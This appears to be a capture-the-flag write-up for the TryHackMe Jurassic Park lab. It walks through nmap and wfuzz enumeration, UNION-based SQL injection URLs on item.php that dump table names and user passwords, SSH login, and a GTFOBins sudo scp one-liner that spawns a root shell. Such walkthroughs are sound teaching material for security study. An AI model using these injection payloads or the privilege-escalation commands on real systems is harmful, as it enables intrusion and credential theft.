---
cover: ../.gitbook/assets/Jurrasic park cover.PNG
coverY: 0
---

# THM -Jurassic Park

## 0. Setup

Link to room [https://tryhackme.com/room/jurassicpark](https://tryhackme.com/room/jurassicpark)

**Read the Room Description:**\
\- enumerate the web application - get credentials to the server - find 5 flags

**Room objectives:**\
\- Get SQL database information - Get system version - Get Dennis' password - Locate flags on the system

## 1. Recon and enumeration

### 1.1 nmap

Use the nmap tool to begin building up a picture of what is running on the machine:

```bash
sudo nmap -sV -T4 -p- $TGT
```

Options explained: -sV runs version detection, -T4 is the timing template to use (0: slowest, 5: quickest), -p- scan all ports, $TGT is the target machine IP

**nmap results:**

<figure><img src="../.gitbook/assets/nmap result.PNG" alt=""><figcaption></figcaption></figure>

* Port 22 open (SSH)
* Port 80 open which will host our rooms web page using Apache 2.4.18

### 1.2 View Website

We can navigate to the website in browser using the target IP `http://<TGTIP>`

![](<../.gitbook/assets/website blank.PNG>)

From here I generally browse the website as a user would do (alongside viewing page sources) to get an idea of the websites functionality and purpose before using enumeration tools. The main page does not offer much but directs us to an online shop that has 3 products that we can navigate to.

![](<../.gitbook/assets/webpage shop.PNG>)

Each of these opens up in the item.php link with the `id` parameter set to a number 1,2 or 3 (for example `http://<TGTIP>/item.php?id=3`). This is worth noting as a potential point for IDOR (If you are unfamiliar with IDOR I recommend reading through [this post on infosecwriteups](https://infosecwriteups.com/what-is-idor-vulnerability-and-how-does-it-affect-you-85431d10f8fb)).

![](<../.gitbook/assets/webpage shop item 3.PNG>)

From viewing the page sources we can see that the images are loaded from the assets directory but upon inspection we do not find anything of use to us.

![](<../.gitbook/assets/assets directory.PNG>)

### 1.3 Enumerate Shop ID Parameter

From section 1.2 we identified the `id` parameter on the item.php page which is worth enumerating to see we can access any other unlisted pages. To do this I used [Wfuzz](https://wfuzz.readthedocs.io/en/latest/) enumerating the parameter which a range of numbers.

I first ran this using the range 0 - 10:

```bash
wfuzz -z range,0-15 http://$TGT/item.php?id=FUZZ
```

![](<../.gitbook/assets/fuzz shop id.PNG>)

Before running with a range all the way up to 100 but this time removing the values that do not return a useful page using the paramter --hl 1

```bash
wfuzz -z range,0-100 --hl 1 http://$TGT/item.php?id=FUZZ
```

![](<../.gitbook/assets/wfuzz shopid.PNG>)

Other than the pages we already know about we have discovered two more pages with id values of 5 and 100

![](<../.gitbook/assets/shop id 5.PNG>)

![](<../.gitbook/assets/shop id 100.PNG>)

With an id value of 5 we have found a development page that lets us know about some blocked characters:

<figure><img src="../.gitbook/assets/webpage blocked chars.PNG" alt=""><figcaption></figcaption></figure>

## 2. Exploitation

### 2.1 SQL Injection

From our objectives and a clue from the blocked characters being common SQL command terms we will look to use the item page to perform SQL Injection.

You may have your own resources to perform SQL injection but I found these very useful to complete this room:

* [MySQL cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [Perspective Risk SQLi cheat sheet](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)

**Method:**\
\- Check we can inject commands by getting an SQL error message - Find the number of columns needed to create a valid request - Enumerate the database from top level downwards to find a password

**Getting and SQL error message**\
If we can get an error in the SQL syntax it can reveal information about the database. We know from our enumeration the the `#` comment character is blocked so I tried `\*` and recieved an error.&#x20;

<figure><img src="../.gitbook/assets/sqli error.PNG" alt=""><figcaption></figcaption></figure>

Now we have identified an area to perform an SQL injection attack and also found out that a MySQL server is running.

At this point I tried to use sqlmap to automate the injection but was not successful with the tool telling me that the target content was not stable.

**Finding the number of columns in to use**\
We can find number of columns required by increasing the number of NULLs we use after the id value:

* /item.php?id=100 UNION SELECT NULL
* This returns a message `The used SELECT statements have a different number of columns`&#x20;

<figure><img src="../.gitbook/assets/sqli column enum.PNG" alt=""><figcaption></figcaption></figure>

* So we continue to add another NULL in the following request until we find a successful request using 5 NULL values - /item.php?id=100 UNION SELECT NULL, NULL, NULL, NULL, NULL

### SQL Database Enumeration

Now that we have a vaild request we can start using our NULL columns to get information from the database. In order to get to the information we want (eventually Dennis' password) I tried to follow a logical path in my injection - Find version - Find database name - Find a table that is likely to hold Dennis' password - Find the password Resources I used to conduct my SQLi: -

**Get version using version()**\
\- /item.php?id=100 UNION SELECT VERSION(), NULL, NULL, NULL, NULL - This didn't show anything to show on the page so I put the tried it in all columns - /item.php?id=100 UNION SELECT VERSION(), VERSION(), VERSION(), VERSION(), VERSION()

![](<../.gitbook/assets/sqli version.PNG>)

Testing the column usage I settled on using the fourth parameter going forward as it wasn't displayed with other text from the web page.

**Get database name using database() function**\
\- /item.php?id=100 UNION SELECT NULL, NULL, NULL, DATABASE(), NULL - Shows up at x package = park package

**Get tables from park database**\
The SQL command we are looking to perform is:

```
SELECT TABLE_NAME
  FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_SCHEMA = 'my_database';
```

This gives us the following URL to try:\
\- /item.php?id=100 UNION select NULL, NULL, NULL, table\_name, NULL FROM INFORMATION\_SCHEMA.COLUMNS WHERE TABLE\_SCHEMA = "park"

![](<../.gitbook/assets/sqli user table (1).PNG>)

This shows us there is a table called "users" in the database. To check if there are any other tables we can use the [group\_concat()](https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group\_concat.php) function

\- /item.php?id=100 UNION select NULL, NULL, NULL, group\_concat(table\_name), NULL FROM INFORMATION\_SCHEMA.COLUMNS WHERE TABLE\_SCHEMA = "park"

![](<../.gitbook/assets/sqli group concat table.PNG>)

**Get column names names from database park and table user**\
The SQL command we are looking to perform is:

```sql
SELECT COLUMN_NAME
  FROM INFORMATION_SCHEMA.COLUMNS
  WHERE TABLE_SCHEMA = 'my_database' AND TABLE_NAME = 'my_table';
```

This gives us the following URL to try:\
\- /item.php?id=100 UNION select NULL, NULL, NULL, group\_concat(column\_name), NULL FROM INFORMATION\_SCHEMA.COLUMNS WHERE TABLE\_SCHEMA = "park" AND TABLE\_NAME = "users"

![](<../.gitbook/assets/sqli user table.PNG>)

So now we have columns id, username, password

**Get Dennis' password from User table**\
The SQL command we are looking to perform is:

```
select password from users where username = "dennis"
```

However, we know from our enumeration that "username" is not allowed. My first thought was to check how many passwords there are before trying to bypass this filter so I used the following request to get all the passwords:

/item.php?id=100 UNION SELECT NULL, NULL, NULL, group\_concat(password) , NULL from users

This returns only two unique passwords:

<figure><img src="../.gitbook/assets/sqli 2 passwords.PNG" alt=""><figcaption></figcaption></figure>

## 3. Post Compromise Enumeration

Now that we have two passwords we can try to logon to the system using SSH and the username Dennis. I tried the first password and successfully logged in where we find the first flag

<figure><img src="../.gitbook/assets/ssh flag 1.PNG" alt=""><figcaption></figcaption></figure>

I ran a find command using the parameter -iname to make the search **case insensitive** picking up the next challenge flag

```bash
find / -type f -iname "flag*" 2>/dev/null
```

<figure><img src="../.gitbook/assets/ssh flag 2.PNG" alt=""><figcaption></figcaption></figure>

## 4. Privilege Escalation

I ran `sudo -l` to check if Dennis could run any commands as root where we find scp

<figure><img src="../.gitbook/assets/priv esc sudo.PNG" alt=""><figcaption></figcaption></figure>

Looking this up on [GTFO bins](https://gtfobins.github.io/gtfobins/scp/#sudo) we can use the following to get a root shell

```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```

<figure><img src="../.gitbook/assets/priv esc whoami root.PNG" alt=""><figcaption></figcaption></figure>

I then ran the same `find` command again to look for flags 3 and 5. This only recovered flag 5 in /root

<figure><img src="../.gitbook/assets/SSH flag 5 (1).PNG" alt=""><figcaption></figcaption></figure>

**So where was flag 3?**\
It appears that flag 3 is not named in the same way as the other flags. So my next approach was to search for flag and then flag3 in the contents of the files

Searching from the root directory took too long so I chose sub folders eventually finding some interesting files in /home

```bash
find /home -type f -exec grep -l "flag" {} \;
```

<figure><img src="../.gitbook/assets/SSH findhome.PNG" alt=""><figcaption></figcaption></figure>

Looking through the contents of these files I eventually found the flag in /home/dennis/.bash\_history

<figure><img src="../.gitbook/assets/ssh bash history flag 3.PNG" alt=""><figcaption></figcaption></figure>

## TLDR

* Go to webpage
* Find item.php page
* Use IDOR to discover SQL filters
* Use SQL injection on the item.php page to recover database info and Dennis' passoword
* Use GTFO bins sudo scp to escalate to root shell
* Search system for flags
